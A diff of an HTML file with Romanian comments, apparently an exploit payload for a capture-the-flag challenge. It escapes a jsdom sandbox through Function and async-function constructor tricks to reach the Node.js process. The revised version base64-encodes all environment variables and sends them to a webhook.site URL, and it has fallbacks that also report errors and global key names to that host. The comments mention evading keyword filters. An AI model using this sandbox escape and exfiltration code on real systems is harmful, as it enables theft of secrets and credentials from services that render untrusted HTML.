@@ -2,26 +2,22 @@
 <html>
 <body>
     <script>
-        try {
-            // Aceasta este metoda specifică pentru jsdom 16.5.3 de a accesa procesul Node.js
-            // Căutăm constructorul funcției în afara mediului limitat (sandbox)
-            const far_away_process = Node.constructor("return process")();
-            
-            // Extragem flag-ul din variabilele de mediu
-            const flag = far_away_process.env.CTF_FLAG;
-
-            // Trimitem flag-ul direct către tine
-            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE=" + flag);
-            
-        } catch (e) {
-            // Dacă dă eroare, încercăm o cale alternativă
+        (async () => {
             try {
-                const alt_process = (async()=>{}).constructor("return process")();
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE_ALT=" + alt_process.env.CTF_FLAG);
-            } catch (e2) {
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?DEBUG_ERR=" + btoa(e2.message));
+                // Încercăm să "pescuim" procesul prin constructorul de funcții asincrone
+                // Această metodă evită adesea filtrele de cuvinte cheie
+                const f = new Function("return (async () => {}).constructor('return process')()");
+                const p = f();
+                
+                // Trimitem toate variabilele de mediu să fim siguri că nu ratăm flag-ul
+                const data = btoa(JSON.stringify(p.env));
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE=" + data);
+            } catch (e) {
+                // Dacă eșuează, încercăm să citim direct orice obiect global suspect
+                const keys = Object.keys(window).filter(k => k.toLowerCase().includes('flag') || k.includes('process'));
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?KEYS=" + btoa(keys.join(',')));
             }
-        }
+        })();
     </script>
 </body>
 </html>
